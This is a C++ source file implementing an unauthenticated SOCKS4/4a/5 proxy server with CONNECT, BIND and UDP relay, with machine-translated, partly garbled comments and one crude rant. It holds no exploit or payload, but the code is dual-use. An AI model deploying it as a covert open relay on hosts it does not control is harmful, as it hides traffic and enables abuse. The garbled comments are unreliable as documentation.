#include <windows.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "socks5server.h"

#include "..\common\mem.h"
#include "..\common\wsocket.h"

//Internal flags.
#define S5_CLIENT_IS_IPV4    0x0  //Klinet connected by IPv4 protocol.
#define S5_CLIENT_IS_IPV6    0x1  //Klinet connected to the IPv6 protocol.
#define S5_ONREPLY_PEER_NAME 0x2  //Specified for Socks5Reply, and soobshaet that need not pluchat
                                  //local data socket and remote.
#pragma pack(push, 1)
typedef struct
{
  //BYTE version;
  BYTE  command;
  WORD  destPort;
  DWORD destIp;
}SOCKS4_QUERY;

typedef struct
{
  BYTE version;
  BYTE  replyCode;
  WORD  destPort;
  DWORD destIp;
}SOCKS4_REPLY;

typedef struct
{
  BYTE version;  //Version
  BYTE command;  //Team
  BYTE reserved; //Reserved
  BYTE addrType; //Address type
}SOCKS5_QUERY;

typedef struct
{
  BYTE version;   //Version
  BYTE replyCode; //Response code
  BYTE reserved;  //Reserved
  BYTE addrType;  //Address type
}SOCKS5_REPLY;

typedef struct
{
  WORD reserved;  //Reserved
  BYTE fragment;  //Current fragment number
  BYTE addrType;  //Address type
}UDP_QUERY;
#pragma pack(pop)

void Socks5Server::init(void)
{

}

void Socks5Server::uninit(void)
{

}

/*
  Отправка ответа клиенту Socks5.

  IN sourceSocket - сокет, на котоырй будет отправлен ответ.
  IN nameSocket   - сокет, данные которого нужно получить или INVALID_SOCKET для ответе с IP и
                    портом заполнинами нулями.
  IN replyCode    - код ответа.
  IN flags        - флаги S5_*.
  
  Return          - (-1) - в сулчаи ошибки получения данных об IP, ответ при этом не отправляется,
                           и данное значение не возможно получить при
                           (nameSocket == INVALID_SOCKET),
                      0  - в случаи ошибки в протоколе или разрыве соединения,
                      1  - в случаи успешной отправки ответа.
*/
static int socks5Reply(SOCKET sourceSocket, SOCKET nameSocket, BYTE replyCode, DWORD flags)
{
  SOCKS5_REPLY sr;
  BYTE replyBuf[sizeof(SOCKS5_REPLY) + IPv6_SIZE + IP_PORT_SIZE + 10];
  LPBYTE ip = replyBuf + sizeof(SOCKS5_REPLY);
  int size;
  
  //Independently poluchame data socket, if necessary.
  if(nameSocket != INVALID_SOCKET)
  {
    SOCKADDR_STORAGE psa;
    size = sizeof(SOCKADDR_STORAGE);

    if(flags & S5_ONREPLY_PEER_NAME)
    {
      if(CWA(ws2_32, getpeername)(nameSocket, (sockaddr *)&psa, &size) != 0)return -1; //Server Error.
    }
    else
    {
      if(CWA(ws2_32, getsockname)(nameSocket, (sockaddr *)&psa, &size) != 0)return -1; //Server Error.
    }
    
    if(psa.ss_family == AF_INET)//IPv4
    {
      sr.addrType = 1; //IPv4
      Mem::_copy(ip,             &((SOCKADDR_IN *)&psa)->sin_addr.S_un.S_addr, IPv4_SIZE);
      Mem::_copy(ip + IPv4_SIZE, &(((SOCKADDR_IN *)&psa)->sin_port),           IP_PORT_SIZE);
      size = IPv4_SIZE + IP_PORT_SIZE;
    }
    else if(psa.ss_family == AF_INET6)//IPv6
    {
      sr.addrType = 4; //IPv6
      Mem::_copy(ip,               ((SOCKADDR_IN6 *)&psa)->sin6_addr.u.Byte, IPv6_SIZE);
      Mem::_copy(ip + IPv6_SIZE , &(((SOCKADDR_IN6 *)&psa)->sin6_port),      IP_PORT_SIZE);
      size = IPv6_SIZE + IP_PORT_SIZE;
    }
    //Not a valid format.
    else return -1; //Server Error.
  }
  else
  {
    Mem::_zero(ip, sizeof(replyBuf) - sizeof(SOCKS5_REPLY));
    if(flags & S5_CLIENT_IS_IPV6){sr.addrType = 4; /*IPv6*/ size = IPv6_SIZE + IP_PORT_SIZE;}
    else {sr.addrType = 1; /*IPv4*/ size = IPv4_SIZE + IP_PORT_SIZE;}
  }
  
  sr.version   = 5;
  sr.reserved  = 0;
  sr.replyCode = replyCode;

  Mem::_copy(replyBuf, &sr, sizeof(SOCKS5_REPLY));
  return WSocket::tcpSend(sourceSocket, replyBuf, sizeof(SOCKS5_REPLY) + size) ? 1 : 0;
}

/*
  RFC 1928:http://www.opennet.ru/base/net/socks5_rfc1928.txt.html
*/
bool Socks5Server::_start5(SOCKET s, DWORD timeout)
{  
  DWORD flags = WSocket::getFamily(s) == AF_INET6 ? S5_CLIENT_IS_IPV6 : S5_CLIENT_IS_IPV4;
  
  //Autentifikatsiya.
  {
    BYTE methodsCount;
    BYTE methods[MAXBYTE];

    if(!WSocket::tcpRecvAll(s, &methodsCount, sizeof(BYTE), timeout) || methodsCount == 0 ||
       !WSocket::tcpRecvAll(s, methods, methodsCount, timeout))return false;
           
    WORD authReply = Mem::_getR(methods, 0, methodsCount) == NULL ? MAKEWORD(5, 0xFF) : MAKEWORD(5, 0);
    if(!WSocket::tcpSend(s, &authReply, sizeof(authReply)))return false;

    //Requires authentication is not found.
    if(authReply == MAKEWORD(5, 0xFF))return true;
  }

  //Receipt of the request.
  SOCKS5_QUERY sq;
  BYTE replyCode = 0; //successful

  if(!WSocket::tcpRecvAll(s, &sq, sizeof(SOCKS5_QUERY), timeout) || sq.version != 5/*Ошибка протокола*/)return false;

  //Prioretet type IP when querying the DNS.
  int familyList[2];
  if(flags & S5_CLIENT_IS_IPV6)
  {
    familyList[0] = AF_INET6;
    familyList[1] = AF_INET;
  }
  else
  {
    familyList[0] = AF_INET;
    familyList[1] = AF_INET6;
  }

  //Getting the destination.
  SOCKADDR *destAddr = NULL;
  switch(sq.addrType)
  {
    //IPv4
    case 1: 
    {
      BYTE bIP[IPv4_SIZE];
      if(!WSocket::tcpRecvAll(s, bIP, sizeof(bIP), timeout))return false;
      if((destAddr = (SOCKADDR *)Mem::alloc(sizeof(SOCKADDR_IN))) == NULL)replyCode = 1; //SOCKS-server error
      else
      {
        SOCKADDR_IN *t = (SOCKADDR_IN *)destAddr;
        t->sin_family = AF_INET;
        Mem::_copy(&t->sin_addr, bIP, sizeof(bIP));
      }
      break;
    }

    //IPv6
    case 4: 
    {
      BYTE bIP[IPv6_SIZE];
      if(!WSocket::tcpRecvAll(s, bIP, sizeof(bIP), timeout))return false;
      if((destAddr = (SOCKADDR *)Mem::alloc(sizeof(SOCKADDR_IN6))) == NULL)replyCode = 1; //SOCKS-server error
      else
      {
        SOCKADDR_IN6 *t = (SOCKADDR_IN6 *)destAddr;
        t->sin6_family = AF_INET6;
        Mem::_copy(&t->sin6_addr, bIP, sizeof(bIP));
      }
      break;
    }

    //Domain
    case 3: 
    {
      BYTE domain[MAXBYTE + 1];
      BYTE domainLen;
      if(!WSocket::tcpRecvAll(s, &domainLen, sizeof(BYTE), timeout) || domainLen == 0 /*Ошибка протокола*/ ||
         !WSocket::tcpRecvAll(s, domain, domainLen, timeout))return false;

      domain[domainLen] = 0;
        
      //Request to the DNS
      struct addrinfo *addrInfoList = NULL;
      if(CWA(ws2_32, getaddrinfo)((char *)domain, NULL, NULL, &addrInfoList) != 0)replyCode = 4; //host unreachable
      else
      {
        //Cycle to find IPv4 and IPv6.
        for(register BYTE i = 0; i < sizeof(familyList) / sizeof(int); i++)
        {
          register struct addrinfo *curAddrInfo = addrInfoList;
          while(curAddrInfo)
          {
            if(curAddrInfo->ai_family == familyList[i])
            {
              if((destAddr = (SOCKADDR *)Mem::copyEx(curAddrInfo->ai_addr, curAddrInfo->ai_addrlen)) == NULL)replyCode = 1; //SOCKS-server error
              else HZ_IPV6_CLEAR(destAddr);
              goto IP_FOUNDED;
            }
            curAddrInfo = curAddrInfo->ai_next;
          }
        }

//Yip was not found.
//IP_NOTFOUNDED:
        replyCode = 4; //host unreachable

//Ip is found or an error.
IP_FOUNDED:
        CWA(ws2_32, freeaddrinfo)(addrInfoList);
      }        
      break;
    }

    default: return false;
  }
            
  //Obtain the port.
  u_short port;
  if(!WSocket::tcpRecvAll(s, &port, sizeof(u_short), timeout))
  {
    Mem::free(destAddr);
    return false;
  }
  
  //if(replyCode == 0 && destAddr == NULL)иReplyCode = 1; //SOCKS-server error
  
  //Errors in the receipt of IP is not found, look team.
  bool retVal = true;
  if(replyCode == 0)
  {
    //Does not make sense, the same position.
    //if (destAddr-> sa_family == AF_INET) ((SOCKADDR_IN *) destAddr) -> sin_port = port;
    //else
    ((SOCKADDR_IN6 *)destAddr)->sin6_port = port;

    //Running
    switch(sq.command)
    {
      //Connect
      case 1:
      {
        SOCKET destSocket = WSocket::tcpConnect((SOCKADDR_STORAGE *)destAddr);
        if(destSocket == INVALID_SOCKET)replyCode = 5; //connection refused
        else
        {
          WSocket::tcpDisableDelay(destSocket, true);
          int l = socks5Reply(s, destSocket, replyCode, flags);
          if(l == 1)WSocket::tcpTunnel(s, destSocket);
          else if(l == -1)replyCode = 1;//SOCKS-server error
          else retVal = false;
          WSocket::tcpClose(destSocket);
        }
        break;
      }

      //Bind
      case 2:
      {
        SOCKET destSocket;

        //I ibal mouth stupid freaks wrote to blunt rfc and tuporlyh govnokoderov,
        //I put a listing on proivzolny port on all IP server and pashel on dick software that is not
        //be able to read it. Maybe I put in zabulzhdenie FlashFXP 3.6.0. Because in destAddr
        //He then sends some data to server. And in rfc, I ponel, there must be data
        //socks-server where you want to wait sedineniya.
        
        //Ischim free port.
        ((SOCKADDR_IN6 *)destAddr)->sin6_port = 0;
        if(destAddr->sa_family == AF_INET6)Mem::_zero(&(((SOCKADDR_IN6 *)destAddr)->sin6_addr), IPv6_SIZE);
        else ((SOCKADDR_IN *)destAddr)->sin_addr.S_un.S_addr = 0;
        
        if((destSocket = WSocket::tcpListen((SOCKADDR_STORAGE *)destAddr, 1)) == INVALID_SOCKET)replyCode = 5; //connection refused
        else
        {
          int l = socks5Reply(s, destSocket, replyCode, flags);
          if(l == 1)
          {
            SOCKET incomingSocket = WSocket::tcpWaitForIncomingAndAccept(&destSocket, 1, 0, NULL, NULL, &s, 1);
            WSocket::tcpClose(destSocket);

            if(incomingSocket == INVALID_SOCKET)replyCode = 1; //SOCKS-server error
            else
            {
              WSocket::tcpDisableDelay(incomingSocket, true);
              if((l = socks5Reply(s, incomingSocket, replyCode, flags | S5_ONREPLY_PEER_NAME)) == 1)WSocket::tcpTunnel(s, incomingSocket);
              WSocket::tcpClose(incomingSocket);
            }
          }
          else WSocket::tcpClose(destSocket);

          if(l == -1)replyCode = 1; //SOCKS-server error
          else if(l != 1)retVal = false;
        }
        break;
      }      

      //UDP
      case 3:
      {
        SOCKADDR_STORAGE saLocal;
        SOCKADDR_STORAGE saRemote;
        int sizeLocal = sizeof(SOCKADDR_STORAGE);
        int sizeRemote = sizeof(SOCKADDR_STORAGE);
        
        //Obtains data about the customer.
        if(CWA(ws2_32, getsockname)(s, (sockaddr *)&saLocal, &sizeLocal) != 0 || CWA(ws2_32, getpeername)(s, (sockaddr *)&saRemote, &sizeRemote) != 0)replyCode = 1; //SOCKS-server error
        else
        {
          //Create an UDP port to communicate with the client on the local IP, which is connected to the client.
          ((SOCKADDR_IN6 *)&saLocal)->sin6_port = 0;
          HZ_IPV6_CLEAR(&saLocal);
          SOCKET clientSocket = WSocket::udpListen(&saLocal);
          
          if(clientSocket == INVALID_SOCKET)replyCode = 1; //SOCKS-server error
          else
          {
            #define UDP_BUFFER 65535
            LPBYTE udpBuf = (LPBYTE)Mem::alloc(UDP_BUFFER);
            if(udpBuf == NULL)replyCode = 1; //SOCKS-server error
            else
            {
              int l = socks5Reply(s, clientSocket, replyCode, flags);
              if(l == 1)
              {
                SOCKET serverSocket = INVALID_SOCKET; //Socket for obsheniya with the server.
                int serverBuffer = 0;                //Data size allocated under the heading of SOCKS-UDP header.
                int serverFamily = 0;

                //Data on the port for pereslyke server-> client.
                SOCKADDR_STORAGE saClient;
                int clientSize = 0;
                
                for(;;)
                {
                  fd_set fd;
                  fd.fd_count = serverSocket == INVALID_SOCKET ? 2 : 3;
                  fd.fd_array[0] = s;
                  fd.fd_array[1] = clientSocket;
                  fd.fd_array[2] = serverSocket;
                
                  if(CWA(ws2_32, select)(0, &fd, NULL, NULL, NULL) <= 0)break; //Error, and silently finish the connection.

                  if(WSocket::_fdIsSet(s, &fd))
                  {   
                    //UDP-connection terminates when terminates TCP-connection to query the UDP ASSOCIATE.
                    if(CWA(ws2_32, recv)(s, (char  *)udpBuf, UDP_BUFFER, 0) <= 0)break;
                  }
                
                  int saLen = sizeof(SOCKADDR_STORAGE);

                  //Data from the client.
                  if(WSocket::_fdIsSet(clientSocket, &fd))
                  {
                    //Poluchame data.
                    int len = CWA(ws2_32, recvfrom)(clientSocket, (char *)udpBuf, UDP_BUFFER, 0, (sockaddr *)&saLocal, &saLen);
                    if(len <= 0)break;

                    //The package is too small, ignore it.
                    if(len < sizeof(UDP_QUERY) + 2/*AS DOMAIN: SIZE+CHAR*/)goto NEXT1;

                    //Checking the IP sender.
                    if(saRemote.ss_family != saLocal.ss_family)goto NEXT1;
                    else if(saLocal.ss_family == AF_INET){if(((SOCKADDR_IN *)&saRemote)->sin_addr.S_un.S_addr != ((SOCKADDR_IN *)&saLocal)->sin_addr.S_un.S_addr)goto NEXT1;}
                    else if(saLocal.ss_family == AF_INET6){if(Mem::_compare(((SOCKADDR_IN6 *)&saRemote)->sin6_addr.u.Byte, ((SOCKADDR_IN6 *)&saLocal)->sin6_addr.u.Byte, IPv6_SIZE) != 0)goto NEXT1;}

                    //Checking the title.
                    if(((UDP_QUERY *)udpBuf)->fragment != 0 || ((UDP_QUERY *)udpBuf)->reserved != 0)goto NEXT1;

                    //Store data on the client UDP port on which will peresylvatsya data from the server.
                    if(clientSize == 0)
                    {
                      Mem::_copy(&saClient, &saLocal, saLen);
                      HZ_IPV6_CLEAR(&saClient);
                      clientSize = saLen;                      
                    }
                    
                    //Obtain the IP and save it in saLocal.
                    int offset = sizeof(UDP_QUERY);
                    Mem::_zero(&saLocal, sizeof(SOCKADDR_STORAGE));
                    switch(((UDP_QUERY *)udpBuf)->addrType)
                    {
                      //IPv4
                      case 1:
                        if(len <= offset + IPv4_SIZE + IP_PORT_SIZE)goto NEXT1;
                        saLen = sizeof(SOCKADDR_IN);
                        saLocal.ss_family = AF_INET;
                        Mem::_copy(&(((SOCKADDR_IN *)&saLocal)->sin_addr), udpBuf + offset, IPv4_SIZE);
                        offset += IPv4_SIZE;
                        break;

                      //IPv6
                      case 4: 
                        if(len <= offset + IPv6_SIZE + IP_PORT_SIZE)goto NEXT1;                      
                        saLen = sizeof(SOCKADDR_IN6);
                        saLocal.ss_family = AF_INET6;
                        Mem::_copy((((SOCKADDR_IN6 *)&saLocal)->sin6_addr.u.Byte), udpBuf + offset, IPv6_SIZE);
                        offset += IPv6_SIZE;
                        break;
              
                      //Domain
                      case 3: 
                      {
                        BYTE domainLen = udpBuf[offset];
                        if(domainLen == 0 || len <= (int)(offset + domainLen + sizeof(BYTE) + IP_PORT_SIZE))goto NEXT1;

                        BYTE domain[MAXBYTE + 1];
                        Mem::_copy(domain, udpBuf + offset + sizeof(BYTE), domainLen) ;
                        domain[domainLen] = 0;
                        offset += domainLen + sizeof(BYTE);

                        //Request to the DNS
                        struct addrinfo *addrInfoList = NULL;
                        if(CWA(ws2_32, getaddrinfo)((char *)domain, NULL, NULL, &addrInfoList) != 0)goto NEXT1;

                        //Cycle to find IPv4 and IPv6.
                        for(register BYTE i = 0; i < sizeof(familyList) / sizeof(int); i++)
                        {
                          register struct addrinfo *curAddrInfo = addrInfoList;
                          while(curAddrInfo)
                          {
                            if(curAddrInfo->ai_family == familyList[i])
                            {
                              saLen = curAddrInfo->ai_addrlen;
                              Mem::_copy(&saLocal, curAddrInfo->ai_addr, saLen);
                              HZ_IPV6_CLEAR(&saLocal);
                              goto UDP_IP_FOUNDED;
                            }
                            curAddrInfo = curAddrInfo->ai_next;
                         }
                        }
                        //Yip was not found.
                        goto NEXT1;

                        //Ip found
UDP_IP_FOUNDED:
                        CWA(ws2_32, freeaddrinfo)(addrInfoList);
                        break;
                      }        

                      default: goto NEXT1;
                    }

                    //Obtain the port.
                    ((SOCKADDR_IN6 *)&saLocal)->sin6_port = *((u_short *)(udpBuf + offset));
                    offset += IP_PORT_SIZE;

                    //Create a socket for the server if it is not suschetvuet.
                    //saLocal - contains data for konekta, create a socket with takoyzhe version of IP,
                    //but with the listing of all IP, since do not know from what IP bude made
                    //communication with the server.
                    if(serverSocket == INVALID_SOCKET)
                    {
                      SOCKADDR_STORAGE sockAddr;
                      Mem::_zero(&sockAddr, sizeof(SOCKADDR_STORAGE));
                      serverFamily = sockAddr.ss_family = saLocal.ss_family;

                      if((serverSocket = WSocket::udpListen(&sockAddr)) == INVALID_SOCKET)break;
                      serverBuffer = sizeof(UDP_QUERY) + (serverFamily == AF_INET6 ? IPv6_SIZE : IPv4_SIZE) + IP_PORT_SIZE;
                    }
                    
                    //Otprovlyaem answer.
                    if(len > offset && serverFamily == saLocal.ss_family)CWA(ws2_32, sendto)(serverSocket, (char *)(udpBuf + offset), len - offset, 0, (sockaddr *)&saLocal, saLen);
                  }                                                                             
NEXT1:    
                  //The data from the server.
                  if(serverSocket != INVALID_SOCKET && WSocket::_fdIsSet(serverSocket, &fd))
                  {
                    int len = CWA(ws2_32, recvfrom)(serverSocket, (char *)(udpBuf + serverBuffer), UDP_BUFFER - serverBuffer, 0, (sockaddr *)&saLocal, &saLen);
                    if(len <= 0 && serverFamily != saLocal.ss_family)goto NEXT2;//?

                    //Fill in the data.
                    ((UDP_QUERY *)udpBuf)->reserved = 0;
                    ((UDP_QUERY *)udpBuf)->fragment = 0;
                    ((UDP_QUERY *)udpBuf)->addrType = saLocal.ss_family == AF_INET6 ? 4 /*IPv6*/ : 1 /*IPv4*/;
                    
                    if(serverFamily == AF_INET6)Mem::_copy(udpBuf + sizeof(UDP_QUERY), &(((SOCKADDR_IN6 *)&saLocal)->sin6_addr), IPv6_SIZE);
                    else if(serverFamily == AF_INET)Mem::_copy(udpBuf + sizeof(UDP_QUERY), &(((SOCKADDR_IN *)&saLocal)->sin_addr), IPv4_SIZE);
                    else goto NEXT2;

                    Mem::_copy(udpBuf + serverBuffer - IP_PORT_SIZE, &(((SOCKADDR_IN6 *)&saLocal)->sin6_port), IP_PORT_SIZE);

                    CWA(ws2_32, sendto)(clientSocket, (char *)udpBuf, len + serverBuffer, 0, (sockaddr *)&saClient, clientSize);
                  }
NEXT2:;
                }

                WSocket::tcpClose(serverSocket);
              }
              else if(l == -1)replyCode = 1; //SOCKS-server error
              else retVal = false;

              Mem::free(udpBuf);
            }
            WSocket::tcpClose(clientSocket);
          }
        }
        break;
      }
      
      //Error
      default: replyCode = 7; //command is not supported
    }
  }
  
  Mem::free(destAddr);

  //Processing errors.
  return (retVal == true && replyCode != 0) ?
         (socks5Reply(s, INVALID_SOCKET, replyCode, flags) != 0 ? true : false) :
         retVal;
}

/*
  Отправка ответа клиенту Socks4.

  IN sourceSocket  - сокет, на котоырй будет отправлен ответ.
  IN nameSocket    - сокет, данные которого нужно получить или INVALID_SOCKET для ответе с IP и
                     портом заполнинами нулями.
  IN replyCode    - код ответа.

  Return           - (-1) - в сулчаи ошибки получения данных об IP, ответ при этом не отправляется,
                            и данное значение не возможно получить при
                            (nameSocket == INVALID_SOCKET),
                       0  - в случаи ошибки в протоколе или разрыве соединения,
                       1  - в случаи успешной отправки ответа.
*/
static int socks4Reply(SOCKET sourceSocket, SOCKET nameSocket, BYTE replyCode, DWORD flags)
{
  SOCKS4_REPLY sr;

  //Independently poluchame data socket, if necessary.
  if(nameSocket != INVALID_SOCKET)
  {
    SOCKADDR_IN sa;
    int size = sizeof(SOCKADDR_IN);
    
    if(flags & S5_ONREPLY_PEER_NAME)
    {
      if(CWA(ws2_32, getpeername)(nameSocket, (SOCKADDR *)&sa, &size) != 0)return -1; //Server Error.
    }
    else
    {
      if(CWA(ws2_32, getsockname)(nameSocket, (SOCKADDR *)&sa, &size) != 0)return -1; //Server Error.
    }
    
    sr.destIp   = sa.sin_addr.S_un.S_addr;
    sr.destPort = sa.sin_port;
  }
  else
  {
    sr.destIp = 0;
    sr.destPort = 0;
  }

  sr.version   = 0;
  sr.replyCode = replyCode;

  return WSocket::tcpSend(sourceSocket, &sr, sizeof(SOCKS4_REPLY)) ? 1 : 0;
}

/*В В http://www.sockschain.com/doc/socks4_protocol.htm*/
bool Socks5Server::_start4(SOCKET s, DWORD timeout)
{
  DWORD flags = WSocket::getFamily(s) == AF_INET6 ? S5_CLIENT_IS_IPV6 : S5_CLIENT_IS_IPV4;
  SOCKS4_QUERY sq;

  //Obtain the title.
  if(!WSocket::tcpRecvAll(s, &sq, sizeof(SOCKS4_QUERY), timeout))return false;

  //Obtain the UserID
  for(;;)
  {
    BYTE tmp;
    if(!WSocket::tcpRecvAll(s, &tmp, sizeof(BYTE), timeout))return false;
    if(tmp == 0)break;
  }
  
  BYTE replyCode = 90; //successful
  
  //Receives a request 4a
  DWORD tmpDword = SWAP_DWORD(sq.destIp);

  if(tmpDword > 0 && tmpDword < 256)
  {
    BYTE domain[MAXBYTE + 1];
    for(int i = 0; ; i++)
    {
      BYTE tmpByte;
      if(i > 255 || !WSocket::tcpRecvAll(s, &tmpByte, sizeof(BYTE), timeout))return false;
      domain[i] = tmpByte;
      if(tmpByte == 0)break;
    }
    
    struct addrinfo *addrInfoList = NULL;
    if(CWA(ws2_32, getaddrinfo)((char *)domain, NULL, NULL, &addrInfoList) != 0)replyCode = 91; //request rejected or failed
    else
    {
      //Cycle to find IPv4.
      register struct addrinfo *curAddrInfo = addrInfoList;
      while(curAddrInfo)
      {
        if(curAddrInfo->ai_family == AF_INET)
        {
          Mem::_copy(&sq.destIp, &(((SOCKADDR_IN *)(curAddrInfo->ai_addr))->sin_addr), IPv4_SIZE);
          break;
        }
        curAddrInfo = curAddrInfo->ai_next;
      }
      CWA(ws2_32, freeaddrinfo)(addrInfoList);

      //IPv4 can not be found
      if(curAddrInfo == NULL)replyCode = 91; //request rejected or failed
    }
  }

  bool retVal = true;
  
  //Processing of the command.
  if(replyCode == 90)
  {
    SOCKADDR_IN sa;
    Mem::_zero(&sa, sizeof(sockaddr_in));
    sa.sin_family = AF_INET;

    switch(sq.command)
    {
      //CONNECT
      case 1:
      {
        sa.sin_port             = sq.destPort;
        sa.sin_addr.S_un.S_addr = sq.destIp;
        
        SOCKET destSocket = WSocket::tcpConnect((SOCKADDR_STORAGE *)&sa);
        if(destSocket == INVALID_SOCKET)replyCode = 91; //request rejected or failed
        else
        {
          WSocket::tcpDisableDelay(destSocket, true);
          int l = socks4Reply(s, destSocket, replyCode, flags);
          if(l == 1)WSocket::tcpTunnel(s, destSocket);
          else if(l == -1)replyCode = 91; //request rejected or failed
          else retVal = false;
          WSocket::tcpClose(destSocket);
        }
        break;
      }
      
      //BIND
      case 2:
      {
        SOCKET destSocket;
        if((destSocket = WSocket::tcpListen((SOCKADDR_STORAGE *)&sa, 1)) == INVALID_SOCKET)replyCode = 91; //request rejected or failed
        else
        {
          int l = socks4Reply(s, destSocket, replyCode, flags);
          if(l == 1)
          {
            SOCKET incomingSocket = WSocket::tcpWaitForIncomingAndAccept(&destSocket, 1, 0, NULL, NULL, &s, 1);
            WSocket::tcpClose(destSocket);

            //In general, there need to check whether you need to connect the server IP, but I do not think
            //it is necessary.
            if(incomingSocket == INVALID_SOCKET)replyCode = 91; //request rejected or failed
            else
            {              
              WSocket::tcpDisableDelay(incomingSocket, true);
              if((l = socks4Reply(s, incomingSocket, replyCode, flags | S5_ONREPLY_PEER_NAME)) == 1)
              {
                WSocket::tcpTunnel(s, incomingSocket);                
              }
              WSocket::tcpClose(incomingSocket);
            }
          }
          else WSocket::tcpClose(destSocket);

          if(l == -1)replyCode = 91; //request rejected or failed
          else if(l != 1)retVal = false;
        }
        break;
      }

      default: replyCode = 91; //request rejected or failed
    }
  }   

  //Processing errors.
  return (retVal == true && replyCode != 90) ?
         (socks4Reply(s, INVALID_SOCKET, replyCode, flags) != 0 ? true : false) :
          retVal;
}

bool Socks5Server::_start(SOCKET s, DWORD timeout)
{
  BYTE socksVersion;
  bool r = false;
  if(WSocket::tcpRecvAll(s, &socksVersion, 1, timeout))
  {
    if(socksVersion == 5)r = _start5(s, timeout);
    else if(socksVersion == 4)r = _start4(s, timeout);
  }
  WSocket::tcpClose(s);
  return r;
}
